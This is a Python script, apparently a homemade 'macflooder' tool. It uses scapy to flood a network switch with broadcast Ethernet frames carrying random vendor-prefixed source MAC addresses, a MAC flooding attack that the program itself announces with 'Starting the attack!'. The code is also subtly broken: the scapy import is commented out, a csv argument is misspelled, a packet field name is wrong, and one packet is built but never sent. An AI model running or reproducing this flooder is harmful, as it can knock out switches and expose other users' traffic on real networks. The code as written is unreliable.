#from scapy.all import *
import sys
import csv

#TODO import csv file parse it store data and look ups
VENDORS = {}
DESTINATIONMAC = "FF:FF:FF:FF:FF:FF"

def loadDataBase():
	with open('MAC.csv') as f:
		csv_reader = csv.reader(f, delimeter=', ')
		line_count = 0
		for vendor_info in csv_reader:
			if line_count == 0:
				line_count += 1
				continue
			else:
				VENDORS[vendor_info[2]] = vendor_info[0]

def main():
	loadDataBase()
	vendor = ""
	vendormac = ""
	print("""
		Welcome to the macflooder program.\n
		You will want to interact with the shell
		via a few commands.
		flood - will start the flooding prep process
		run - will start the running of the mac flooding
		quit - will stop the program
	""")
	while True:
		command = input(">> ")
		if command == "quit":
			sys.exit()
		elif command == "flood":
			print("Enter name of the vendor")
			vendor = input('>> ')
			vendormac = VENDORS[vendor]
		elif command == "run":
			print("Starting the attack!")
			while True:
				randomMAC = vendormac + ":".join(RandMAC().split(":")[3:])
				print(randomMAC + " is being sent")
				sendp(Ether(src=randomMAC, dest=DESTINATIONMAC))
				ARP(op=2, psrc="0.0.0.0", hwdst=DESTINATIONMAC)/Padding(load="X"*18, verbose=0)
		else:
			print("command not recognized exiting program.")
			sys.exit()

if __name__ == "__main__":
	main()

